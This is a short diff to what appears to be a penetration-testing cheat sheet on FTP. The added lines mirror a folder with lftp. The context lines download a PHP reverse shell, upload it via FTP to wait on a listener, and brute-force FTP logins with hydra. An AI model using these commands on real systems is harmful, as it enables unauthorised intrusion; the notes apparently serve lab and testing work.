@@ -747,6 +747,10 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 # Upload the payload you downloaded and check listener
 ftp> put shell.php
 
+#download folders
+lftp -u user,password ftp://adresse_du_serveur
+mirror -c dossier_a_telecharger
+
 --------
 #bruteforce
 sudo hydra -L users.txt -P '/wordlist' -s 21 ftp://$IP
